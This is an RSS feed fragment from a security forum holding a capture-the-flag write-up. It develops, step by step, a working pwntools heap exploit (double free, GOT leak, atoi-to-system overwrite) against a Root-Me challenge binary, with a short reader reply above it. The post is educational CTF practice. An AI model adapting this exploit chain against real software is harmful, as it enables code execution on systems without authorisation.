        <description><![CDATA[
            <p>This has been my first encounter with heap exploitation, and I’ve got to say, I learnt a lot just reading through this.</p>
<p>Slightly unrelated things as well, such as <code>gdb --pid</code>, or the <code>c = process()</code> syntax. Little things like this are really super helpful when you’re starting out in Exploit Dev.</p>
<p>The ASLR bypass is also interesting to note, I never knew the libc-database tool existed, using this tool, would the libc offsets be consistent across machines? Or is it something that is specific?</p>
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055/2">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055/2</link>
        <pubDate>Thu, 18 May 2017 22:31:59 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-2055-2</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055.rss">Heap Exploitation | Playing with chunks!</source>
      </item>
      <item>
        <title>Heap Exploitation | Playing with chunks!</title>
        <dc:creator><![CDATA[exploit]]></dc:creator>
        <description><![CDATA[
            <p>##<span class="hashtag-raw">#Solving</span> a Heap exploitation challenge <img src="https://d.clarkee.co.uk/images/emoji/twitter/smiley.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"><br>
In the name of Allah, the most beneficent, the most merciful.</p>
<hr>
<ul>
<li>
<p>Thanks to <a class="mention" href="https://d.clarkee.co.uk/u/_py">@_py</a> and <a class="mention" href="https://d.clarkee.co.uk/u/n0tnu11">@n0tnu11</a>  who encouraged me, to write about such thing..</p>
</li>
<li>
<p>I want to say sorry, cause i don’t write alot more articles, you know guys, studies <img src="https://d.clarkee.co.uk/images/emoji/twitter/sweat.png?v=15" title=":sweat:" class="emoji" alt=":sweat:" loading="lazy" width="20" height="20">..</p>
</li>
<li>
<p>It wasn’t easy for me to solve this challenge, took me alot of testing, almost two days.</p>
</li>
<li>
<p>Hello everyone to this article..</p>
</li>
<li>
<p>For learning purposes <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
</li>
<li>
<p>Challenge is only solved by 35, was 26 when i finished it!</p>
</li>
</ul>
<p>Before we start, let’s take a look at the informations given on the binary and what kind of protections are ON..</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/3/3b06c15480413792b373d01eaa928117d7c2ed55.png" data-download-href="/uploads/short-url/8qaDUmS7Q0S9GVjPu9JhzIkZjgh.png?dl=1" title="he_p.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/3/3b06c15480413792b373d01eaa928117d7c2ed55.png" width="690" height="141"></a></div><p></p>
<p>Oh yeah, the following protections are ON:</p>
<blockquote>
<p>ASLR<br>
NX<br>
SSP<br>
PARTIAL RELRO</p>
</blockquote>
<p>Awesome, a perfect target, to start our heap exploitation adventure!<br>
We have also, the source code, and the binary is given!</p>
<ul>
<li>Better find a music to listen to:</li>
<li>I will listen to <a href="https://www.youtube.com/watch?v=JgJ4g90u2V8" rel="noopener nofollow ugc">this</a>!</li>
</ul>
<p>Awesome, let me first run my VM machine, and then download the binary from the server!<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/c/c85d994691de0247a47988f1b5d38a6c1d1b5060.png" data-download-href="/uploads/short-url/sAw1LmyGjvEnuBZ8a6CnOBdTOcU.png?dl=1" title="he_p1.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/c/c85d994691de0247a47988f1b5d38a6c1d1b5060.png" width="690" height="195"></a></div><p></p>
<p>Great, we now, should take a look at the source given, and try to make a plan for the attack..<br>
We have 3 functions that seem important:</p>
<ul>
<li>creation() to allocate..</li>
<li>change() to edit..</li>
<li>delete() to free..</li>
<li>show() to show information..</li>
</ul>
<p>Awesome, so now let’s take a look at the functions.. <img src="https://d.clarkee.co.uk/images/emoji/twitter/yum.png?v=15" title=":yum:" class="emoji" alt=":yum:" loading="lazy" width="20" height="20"></p>
<pre data-code-wrap="c"><code class="lang-c">struct entry *creation() {
    char name[64];
    struct entry *e;
 
    e = (struct entry *) malloc(sizeof(struct entry));
 
    printf("Name: ");
    fgets(name, NAME_LEN_MAX, stdin);
    name[strlen(name)-1] = 0;
    e-&gt;name = malloc(strlen(name));
    strcpy(e-&gt;name, name);
 
    printf("Age: ");
    fgets(name,6,stdin);
    e-&gt;age = atoi(name);
 
    return e;
}
</code></pre>
<p>Uhmm, it will allocate 2 chunks, one built on the struct of entry..<br>
Keep in mind that the struct of entry looks like this:</p>
<pre data-code-wrap="c"><code class="lang-c">struct entry {
  int age;
  char *name;
};
</code></pre>
<ul>
<li>So, in the first allocated chunk there will be stored the age, and a pointer to next chunk, where name will be stored!</li>
</ul>
<p>Great!<br>
Now let’s see the delete function!</p>
<pre data-code-wrap="c"><code class="lang-c">void delete(int i) {
    free(directory[i]-&gt;name);
    free(directory[i]);
}
</code></pre>
<ul>
<li>It will free the chunk containing the age and pointer to name, and the next chunk that contains the name!</li>
</ul>
<p>The show() function:</p>
<pre data-code-wrap="c"><code class="lang-c">void show(int i) {
    printf("[%d] %s, %d years old\n", i, directory[i]-&gt;name, directory[i]-&gt;age);
}
</code></pre>
<ul>
<li>Seems like it will print information about one chunk we choose!</li>
<li>May lead to some kind of leak, if we controlled the *name..</li>
</ul>
<p>And the change() function!</p>
<pre data-code-wrap="c"><code class="lang-c">void change(int e) {
    char name[64];
 
    printf("New name: ");
    fgets(name, strlen(directory[e]-&gt;name)+1, stdin);
 
    name[strlen(name)] = 0;
    strcpy(directory[e]-&gt;name, name);
    printf("New age: ");
    fgets(name, 6, stdin);
    directory[e]-&gt;age = atoi(name);
}
</code></pre>
<ul>
<li>It will strcpy our first input to directory[e]-&gt;name, and the second input will be put in age!</li>
<li>There’s seems to be an offbyone bug there, may allow us to change the size of the next chunk..</li>
<li>We can overwrite arbitrary address if we controlled *name..</li>
</ul>
<p>Questions that come to our head now!</p>
<ul>
<li>How can we overwrite the *name?</li>
</ul>
<p>Well, this is the real problem, we should become creative..<br>
Let’s start the program, and start analysing memory!</p>
<p>When we start it, we get this menu..<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/e/e148cc032808ec0f7a142ddfbf8e7b8ed4fe4c8e.png" width="341" height="221"></p>
<p>Let’s start it again, but this time, using GDB, to analyse memory, and see our chunks..</p>
<ul>
<li>gdb ch44 -q</li>
</ul>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/6/6b77c48d0972450d5e7a6eedd62094856d9541b8.png" width="408" height="239"></p>
<p>Awesome, let’s now create a new entry!<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/9/93e84fdab3f7f29e0b4a2f7cd9f9ac25225a6706.png" width="169" height="104"></p>
<p>Great, now let’s take a look at memory, we will look at &amp;directory!</p>
<ul>
<li>Ctrl + C to interrupt the execution and write c in gdb so it continues executing again!</li>
</ul>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/7/751cded05b2260fc2855ab10bf085710804190f1.png" width="382" height="36"></p>
<p>Alright, let’s see &amp;directory!<br>
<img src="//0x00sec.s3.amazonaws.com/original/2X/c/c1747097d6f06c9adfd74dbeb2ebcf2900cf78bc.png" width="672" height="112"></p>
<p>Awesome, so the first entry is here: 0x605010!<br>
Let’s take a look at what’s in this area!</p>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/6/63d2639d040bfb15e3ec773d279dc49b88374edb.png" width="527" height="113"></p>
<p>Great!<br>
The structure of the chunk looks like as we said before!<br>
( size + age + *name + prev_size + size + name + junk.. + wilderness )</p>
<p>Awesome, let’s start writing the functions in our exploit.py</p>
<pre data-code-wrap="py"><code class="lang-py">#!/usr/bin/python
from pwn import *

# PROCESS
c = process("./ch44")

# FUNCTIONS
def allocate( nm, age ):
	c.sendline('1')
	c.recvuntil(': ')
	c.sendline( nm )
	c.recvuntil(': ')
	c.sendline( str(age) )
	c.recvuntil('&gt;')
def free( id ):
	c.sendline('2')
	c.recvuntil(': ')
	c.sendline(str(id))
	c.recvuntil('&gt;')
def view( id ):
	c.sendline('4')
	c.recvuntil('[' + str(id) + '] ')
	name = c.recvuntil(', ')[:-2]
	age = c.recvuntil(' years')[:-6]
	c.recvuntil('&gt;')
	return name, age
def edit( id, name, age ):
	c.sendline('3')
	c.recvuntil(': ')
	c.sendline( str(id) )
	c.recvuntil(': ')
	c.sendline( name )
	c.recvuntil(': ')
	c.sendline( str(age) )
	c.recvuntil('&gt;')
# ATTACH
pause()

# EXPLOIT


# INTERACTIVE
c.interactive()
</code></pre>
<p>Seems awesome, now we can start writing our exploit!</p>
<ul>
<li>We will mostly modify the EXPLOIT part <img src="https://d.clarkee.co.uk/images/emoji/twitter/wink.png?v=15" title=":wink:" class="emoji" alt=":wink:" loading="lazy" width="20" height="20"></li>
</ul>
<p>let’s start by allocating some chunks, let’s say 4 chunks..<br>
What size of each chunk will we choose ?</p>
<ul>
<li>After analysing a bit and trying different chunk sizes, i’ll choose 56, cause we can control all the chunk with that size, allowing us to overwrite the next chunk size with the offbyone we saw before!</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )
allocate( 'D'*56, 15 )
</code></pre>
<p>Let’s run the exploit now, and attach it to GDB!<br>
</p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/c/c3a0055c6c0f5ceb594f8d9e48128ee8a8bae14c.png" data-download-href="/uploads/short-url/rUzWTTdcQHiXDZ22qk60iGSz6YA.png?dl=1" title="he_p8.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/c/c3a0055c6c0f5ceb594f8d9e48128ee8a8bae14c.png" width="690" height="332"></a></div><p></p>
<ul>
<li>Now, we should write continue ( c ) in gdb and then press enter in the other terminal, where the exploit.py is running ( pause() )!</li>
<li>After doing that, the four chunks will be allocated, and we will use CTRL + C in gdb again and then examine them in memory!</li>
</ul>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/a/a3eb3871e4b9a8eb372b559022fc750393ad8dc9.png" width="527" height="378"></p>
<p>Great, all seems working just great!<br>
What if we now free some chunks what will happen?</p>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )
allocate( 'D'*56, 15 )
free(2)
free(1)
</code></pre>
<ul>
<li>Alright let’s run the exploit again, and see how the chunks look like now!</li>
</ul>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/4/4a60bcefc820e9e4655f78827f8790b70b59516b.png" width="525" height="377"></p>
<ul>
<li>We can see that the FD of chunk 1 was set to the prev_size of chunk 2..</li>
<li>So now, what do we have?</li>
<li>We have 4 free chunks.. let’s try and allocate something that will fit the chunk with 0x21 in size..</li>
</ul>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/3/3997768af33f23ce7e278227f377993937ca950f.png" width="531" height="112"></p>
<ul>
<li>HELL YEAH!</li>
<li>So, this maybe can help us, but not in this situation..</li>
<li>Cause chunk 1 entry looks like this:</li>
</ul>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/4/43a9c0fdd7999db8ad413be2b15904115d6a3c8b.png" width="534" height="35"></p>
<ul>
<li>Where 0x20690d0 is where chunk 2 entry starts..</li>
<li>Then it’s considered as a name..</li>
</ul>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/9/9ef357056212b79082c93a148dc06c5edb64a54b.png" width="686" height="80"></p>
<ul>
<li>Keep this in mind, it may help us later..</li>
<li>And since this way won’t help us alot now, let’s try and become more creative..</li>
<li>When we free a chunk, it will be placed in a free_list, then when we allocate a chunk it will placed there if the size fits it!</li>
</ul>
<blockquote></blockquote>
<p><code>So when we free chunk 1 then chunk 2 Free_list will look like this : </code><br>
±------------------------±------------------------+</p>
<ul>
<li>////////CHUNK1/////// + ////////CHUNK2/////// +<br>
±------------------------±------------------------+<br>
<code>Then, when the next allocation happens, the first chunk to be filled is the last free()'d which is chunk2..</code></li>
</ul>
<p>But what if we free’d chunk2 two times, if we did it directly a crash occurs!</p>
<ul>
<li>We can free chunk2 then chunk1 then chunk2 again, and this will prevent the crash from happening ( double free )…</li>
<li>And free_list will look like this.. chunk2 → chunk1 → NULL</li>
</ul>
<p>Awesome, let’s try that!</p>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )
allocate( 'D'*56, 15 )

free(2)
free(1)
free(2)
</code></pre>
<p>And it worked, what if allocated another chunk of same size ( 56 ) now ?</p>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )
allocate( 'D'*56, 15 )

free(2)
free(1)
free(2)

allocate( 'E'*56, 15 )
</code></pre>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/7/7409a54b4fbb0b4db430bbc1f0489905c5330c83.png" width="682" height="72"></p>
<ul>
<li>Uhmm, everything seems normal, let’s examine memory and see how &amp;directory looks like!</li>
</ul>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/5/51605da5c0dcb1e9ed15759218657c92a9cd8770.png" width="690" height="53"></p>
<ul>
<li>Oh yeah, so we got two different index in directory that point to the same to the same area!</li>
<li>So, if we free()'d one of them, we will have some kind of heapleak..</li>
<li>We will try free()'ing chunk2 since it’s the last one that got filled and chunk1 is now on top of free_list, free()'ing it will result in a crash!</li>
<li>Oh no! we ended up in a crash while freeing both, let’s try changing the exploit a bit to fit that!</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )

free(2)
free(1)
free(2)

allocate( 'D'*56, 15 )

free(2)
</code></pre>
<ul>
<li>Now that, seems just PERFECT!</li>
</ul>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/2/2176badcbef1465ca610e81b8e2780f4bcb7face.png" width="681" height="221"></p>
<ul>
<li>And here we gooo!</li>
<li>We got a heap_leak, but that’s not what we are looking for, we should get a libc_leak!</li>
<li>Remember the bug we found but didn’t use, that let us overwrite the *name, we’ll try using it now..</li>
<li>We got to find a way to overwrite the *name of a chunk that’s in-use!</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )

free(2)
free(1)
free(2)

allocate( 'D'*56, 15 )

free(2)

allocate( 'A'*16, 15 )
</code></pre>
<ul>
<li>Nothing happens here, so let’s free chunk 0, and allocate twice..</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )

free(2)
free(1)
free(2)

allocate( 'D'*56, 15 )

free(2)
free(0)

allocate( 'A'*16, 15 )
allocate( 'A'*16, 15 )
</code></pre>
<ul>
<li>What, we got sigsegv when we tried to print entries!</li>
</ul>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/6/6915266130fcd71c03fdce5a2baec48f050c8ccc.png" width="378" height="61"></p>
<ul>
<li>Seems weird, the first guess is that it tried reading from address 0x4141414141414141.</li>
<li>Which is overwritten name pointer in chunk2!</li>
<li>Let’s examine in GDB to make sure!</li>
</ul>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/f/f2df79a19bb86d553b5811240d24d81a504047f8.png" width="642" height="188"></p>
<ul>
<li>And yeah, it treated the AAAAAAAA as a PTR!</li>
<li>Let’s see now what we can do!</li>
<li>We will add a part in exploit.py!</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py"># ENTRIES
free_got = 0x602018
</code></pre>
<p>We will also write a little function to return the address in littleendian.. since p64() didn’t put the address correctly in this example..</p>
<pre data-code-wrap="py"><code class="lang-py">def revaddr(addr):
	h = hex(addr)[2:]
	t = ""
	for i in xrange(len(h) - 2, -2, -2):
		m = i + 2
		t += chr(int(h[i:m], 16))
	return t
</code></pre>
<p>And then let’s comeback to exploit part and edit our exploit making the *name point to free_got!</p>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )

free(2)
free(1)
free(2)

allocate( 'D'*56, 15 )

free(2)
free(0)

allocate( 'A'*8, 15 )
allocate( 'A'*8 + revaddr(free_got), 15 )
</code></pre>
<ul>
<li>Awesome, now let’s try showing entries! <img src="https://d.clarkee.co.uk/images/emoji/twitter/smiley.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></li>
</ul>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/f/f870367725ea1062be501189966d37a805012724.png" width="375" height="76"> </p>
<ul>
<li>Perfect, now we got a libc_leak!</li>
<li>We are going to use view() function to store the leak!</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )

free(2)
free(1)
free(2)

allocate( 'D'*56, 15 )

free(2)
free(0)

allocate( 'A'*8, 15 )
allocate( 'A'*8 + revaddr(free_got), 15 )

name, age = view(1)
leak = u64(name.ljust(8, '\x00'))
print 'free() @ ' + hex(leak)
</code></pre>
<ul>
<li>I prefer changing atoi_got since it’s an easier and more guaranteed way to get shell!</li>
</ul>
<pre data-code-wrap="c"><code class="lang-c">int choice(int min, int max, char * chaine) {
    int i;
    char buf[6];
    i = -1;
    while( (i &lt; min) || (i &gt; max)) {
        printf("%s", chaine);
        fgets(buf, 5, stdin);
        i = atoi(buf); // HERE
    }
    return i ;
}
</code></pre>
<ul>
<li>Great, now we know where atoi actually is, let’s calculate where libc_base will be!</li>
<li>I’ll use GDB!</li>
<li>Using vmmap i got libc_base, and we leaked the address of atoi_got!</li>
<li>Let’s calculate atoi_got - libc_base and system - libc_base!</li>
</ul>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/6/64822c837451b6f78ae9caed3603e7b5bb7907c6.png" data-download-href="/uploads/short-url/el8DSQ0nNOhCbApajyXyZN3WBzU.png?dl=1" title="he_p24.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/6/64822c837451b6f78ae9caed3603e7b5bb7907c6.png" width="690" height="276"></a></div><p></p>
<ul>
<li>Great, let’s create a new part in exploit.py</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py"># DIFF LOCAL
libcdiff = 0x34260
sysdiff = 0x3f460
</code></pre>
<p>Let’s now make use of them in the exploit part!</p>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )

free(2)
free(1)
free(2)

allocate( 'D'*56, 15 )

free(2)
free(0)

allocate( 'A'*8, 15 )
allocate( 'A'*8 + revaddr(atoi_got), 15 )

name, age = view(1)
leak = u64(name.ljust(8, '\x00'))
libc_base = leak - libcdiff
system = libc_base + sysdiff

print 'libc_base @ ' + hex(libc_base)
print 'system() @' + hex(system)
</code></pre>
<ul>
<li>Let’s test the exploit and see where we going!</li>
</ul>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/b/b51ba7bddc047b528678ce14f58a026f4accee3d.png" width="405" height="183"></p>
<ul>
<li>Great! now, let’s use the change() function that we spoke about, and change the content of atoi_got to system!</li>
<li>So in the end the exploit part will become the following!</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py"># EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )

free(2)
free(1)
free(2)

allocate( 'D'*56, 15 )

free(2)
free(0)

allocate( 'A'*8, 15 )
allocate( 'A'*8 + revaddr(atoi_got), 15 )

name, age = view(1)
leak = u64(name.ljust(8, '\x00'))
libc_base = leak - libcdiff
system = libc_base + sysdiff

print 'libc_base @ ' + hex(libc_base)
print 'system() @' + hex(system)

edit( 1, p64(system), 'sh\x00' )
</code></pre>
<ul>
<li>Alright let’s run the exploit now!</li>
</ul>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/e/e01621bad284375c9bb061d458ca51d2f1a1e551.png" width="414" height="146"></p>
<ul>
<li>Awesome, we got our shell, but that’s in local only..</li>
<li>Let’s first collect all parts in our current exploit.py!</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py">#!/usr/bin/python
from pwn import *

# ENTRIES
atoi_got = 0x602078

# PROCESS
c = process("./ch44")

# DIFF LOCAL
libcdiff = 0x34260
sysdiff = 0x3f460

# FUNCTIONS
def allocate( nm, age ):
	c.sendline('1')
	c.recvuntil(': ')
	c.sendline( nm )
	c.recvuntil(': ')
	c.sendline( str(age) )
	c.recvuntil('&gt;')
def free( id ):
	c.sendline('2')
	c.recvuntil(': ')
	c.sendline(str(id))
	c.recvuntil('&gt;')
def view( id ):
	c.sendline('4')
	c.recvuntil('[' + str(id) + '] ')
	name = c.recvuntil(', ')[:-2]
	age = c.recvuntil(' years')[:-6]
	c.recvuntil('&gt;')
	return name, age
def edit( id, name, age ):
	c.sendline('3')
	c.recvuntil(': ')
	c.sendline( str(id) )
	c.recvuntil(': ')
	c.sendline( name )
	c.recvuntil(': ')
	c.sendline( str(age) )
	c.recvuntil('&gt;')
def revaddr(addr):
	h = hex(addr)[2:]
	t = ""
	for i in xrange(len(h) - 2, -2, -2):
		m = i + 2
		t += chr(int(h[i:m], 16))
	return t

# ATTACH
pause()

# EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )

free(2)
free(1)
free(2)

allocate( 'D'*56, 15 )

free(2)
free(0)

allocate( 'A'*8, 15 )
allocate( 'A'*8 + revaddr(atoi_got), 15 )

name, age = view(1)
leak = u64(name.ljust(8, '\x00'))
libc_base = leak - libcdiff
system = libc_base + sysdiff

print 'libc_base @ ' + hex(libc_base)
print 'system() @' + hex(system)

edit( 1, p64(system), 'sh\x00' )

# INTERACTIVE
c.interactive()
</code></pre>
<ul>
<li>Let’s connect to the server and see the libc used!</li>
<li>We’ll run the program using gdb then break using CTRL + C then:</li>
</ul>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/c/cc4de18358aa5f2c4b6d0ca27fba8c4d5dbb6fe5.png" width="677" height="64"></p>
<ul>
<li>So the libc is located at : /lib/x86_64-linux-gnu/libc.so.6</li>
<li>I’ll download it, and i’ll use libcdatabase tool:</li>
</ul>
<aside class="onebox githubrepo" data-onebox-src="https://github.com/niklasb/libc-database">
  <header class="source">

      <a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener nofollow ugc">github.com</a>
  </header>

  <article class="onebox-body">
    <div class="github-row" data-github-private-repo="false">
  <img width="690" height="344" src="https://opengraph.githubassets.com/9138e18a8bfd730395cbec6d645f9a2b/niklasb/libc-database" class="thumbnail">

  <h3><a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener nofollow ugc">GitHub - niklasb/libc-database: Build a database of libc offsets to simplify...</a></h3>

    <p><span class="github-repo-description">Build a database of libc offsets to simplify exploitation</span></p>
</div>

  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/1/1077aebe71c5e82a64d6c26a3fcda957553d430c.png" data-download-href="/uploads/short-url/2lG3C6M6weCi5ckxaPKnhGQdvhq.png?dl=1" title="he_p28.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/1/1077aebe71c5e82a64d6c26a3fcda957553d430c.png" width="690" height="124"></a></div><p></p>
<ul>
<li>then we’ll use libcdatabase → ./add libc.so.6</li>
</ul>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/e/ea7c0079d24f3aadb6f8eab854ed2bc2e968764a.png" data-download-href="/uploads/short-url/xsloQPXSfDr9mAXLNgiiEpN1iFI.png?dl=1" title="he_p29.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/e/ea7c0079d24f3aadb6f8eab854ed2bc2e968764a.png" width="690" height="242"></a></div><p></p>
<ul>
<li>We got everything we need, except atoi!</li>
</ul>
<p><img src="//0x00sec.s3.amazonaws.com/original/2X/c/c17a63a660a7b94444fa13057bdb88ce20506725.png" width="690" height="56"></p>
<ul>
<li>We will now edit a part in exploit.py!</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py"># DIFF REMOTE
libcdiff = 0x39ea0
sysdiff = 0x46590
</code></pre>
<ul>
<li>And we will also set c to remote!</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py"># REMOTE
c = remote( 'challenge03.root-me.org', 56544 )
</code></pre>
<ul>
<li>The full exploit now looks like this:</li>
</ul>
<pre data-code-wrap="py"><code class="lang-py">#!/usr/bin/python
from pwn import *

# ENTRIES
atoi_got = 0x602078

# REMOTE
c = remote( 'challenge03.root-me.org', 56544 )

# DIFF REMOTE
libcdiff = 0x39ea0
sysdiff = 0x46590

# FUNCTIONS
def allocate( nm, age ):
	c.sendline('1')
	c.recvuntil(': ')
	c.sendline( nm )
	c.recvuntil(': ')
	c.sendline( str(age) )
	c.recvuntil('&gt;')
def free( id ):
	c.sendline('2')
	c.recvuntil(': ')
	c.sendline(str(id))
	c.recvuntil('&gt;')
def view( id ):
	c.sendline('4')
	c.recvuntil('[' + str(id) + '] ')
	name = c.recvuntil(', ')[:-2]
	age = c.recvuntil(' years')[:-6]
	c.recvuntil('&gt;')
	return name, age
def edit( id, name, age ):
	c.sendline('3')
	c.recvuntil(': ')
	c.sendline( str(id) )
	c.recvuntil(': ')
	c.sendline( name )
	c.recvuntil(': ')
	c.sendline( str(age) )
	c.recvuntil('&gt;')
def revaddr(addr):
	h = hex(addr)[2:]
	t = ""
	for i in xrange(len(h) - 2, -2, -2):
		m = i + 2
		t += chr(int(h[i:m], 16))
	return t

# ATTACH
pause()

# EXPLOIT
allocate( 'A'*56, 15 )
allocate( 'B'*56, 15 )
allocate( 'C'*56, 15 )

free(2)
free(1)
free(2)

allocate( 'D'*56, 15 )

free(2)
free(0)

allocate( 'A'*8, 15 )
allocate( 'A'*8 + revaddr(atoi_got), 15 )

name, age = view(1)
leak = u64(name.ljust(8, '\x00'))
libc_base = leak - libcdiff
system = libc_base + sysdiff

print 'libc_base @ ' + hex(libc_base)
print 'system() @' + hex(system)

edit( 1, p64(system), 'sh\x00' )

# INTERACTIVE
c.interactive()
</code></pre>
<ul>
<li>Let’s now run the exploit and see the result..</li>
</ul>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="//0x00sec.s3.amazonaws.com/original/2X/6/6a88b96bad34519080cd2acaaf554f97cd43a26a.png" data-download-href="/uploads/short-url/fcrxCHTGk0N2HSNvKP8XEXeSbAS.png?dl=1" title="he_p31.png" rel="noopener nofollow ugc"><img src="//0x00sec.s3.amazonaws.com/original/2X/6/6a88b96bad34519080cd2acaaf554f97cd43a26a.png" width="690" height="162"></a></div><p></p>
<ul>
<li>And we got our shell!</li>
<li>Hope you enjoyed, and learned too! <img src="https://d.clarkee.co.uk/images/emoji/twitter/slight_smile.png?v=15" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></li>
<li>See you all in next article <img src="https://d.clarkee.co.uk/images/emoji/twitter/smiley.png?v=15" title=":smiley:" class="emoji" alt=":smiley:" loading="lazy" width="20" height="20"></li>
</ul>
<p>~ exploit</p>
          <p><a href="https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055/1">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055/1</link>
        <pubDate>Thu, 18 May 2017 21:45:36 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-2055-1</guid>
        <source url="https://d.clarkee.co.uk/t/heap-exploitation-playing-with-chunks/2055.rss">Heap Exploitation | Playing with chunks!</source>
      </item>
  </channel>
</rss>
